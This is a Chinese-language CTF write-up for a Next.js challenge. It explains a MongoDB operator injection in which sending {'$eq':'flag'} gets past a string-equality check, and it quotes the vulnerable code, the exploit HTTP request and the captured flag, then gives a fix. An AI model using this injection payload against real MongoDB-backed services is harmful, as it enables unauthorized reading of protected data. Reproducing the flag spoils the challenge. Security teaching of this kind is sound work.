# Next.db

## 题目简述

题目是一个 Next.js 搜索接口。MongoDB 中存在一条 `name` 为 `flag`、`description` 为 flag 内容的记录，但接口显式禁止提交字符串 `"flag"`。漏洞来自 JavaScript 的动态类型与 MongoDB 查询对象直接拼接：将 `name` 从字符串改为包含运算符的对象，即可绕过检查并注入查询条件。

## 解题过程

数据库初始化代码插入了以下敏感记录：

```javascript
{
  id: 0,
  name: "flag",
  description: process.env.FLAG || "flag{test}",
}
```

`/api/search` 从 JSON 请求体中取出 `name`，只拒绝严格等于字符串 `"flag"` 的值：

```javascript
const { name } = req.body;

if (name === "flag") {
  return res.status(500).json({
    message: "You are not allowed to search for the flag"
  });
}
```

之后，`name` 没有经过类型检查或字符串化，就被直接放进 MongoDB 查询：

```javascript
const results = await collection.find({
  $or: [
    { name },
    {
      $and: [
        { description: { $regex: name.toString(), $options: "i" } },
        { description: { $ne: process.env.FLAG || "flag{test}" } }
      ]
    }
  ]
}).toArray();
```

正常请求 `{"name":"flag"}` 会被拦截，但 JSON 也可以表示对象。提交 `{"name":{"$eq":"flag"}}` 后：

1. `name` 的类型是对象，因此 `name === "flag"` 为 `false`；
2. 查询中的简写 `{ name }` 展开为 `{ name: { "$eq": "flag" } }`；
3. MongoDB 将 `$eq` 解释为运算符，第一条 `$or` 分支直接命中敏感记录；
4. 第二条分支即使不匹配，也不影响 `$or` 的最终结果。

完整请求为：

```http
POST /api/search HTTP/1.1
Host: TARGET
Content-Type: application/json

{"name":{"$eq":"flag"}}
```

响应数组中 `id: 0` 记录的 `description` 即为：

```text
0xGame{mongodb_injection_in_next_js_eeb1751b8d4c}
```

## 方法总结

本题不是靠字符串拼接产生的传统注入，而是服务端允许客户端控制 BSON 查询结构。修复时应先验证 `typeof name === "string"`，再构造固定形状的查询；更稳妥的做法是只把经过验证的纯字符串传给具体比较操作，绝不能把用户提供的对象直接嵌入 MongoDB 条件中。
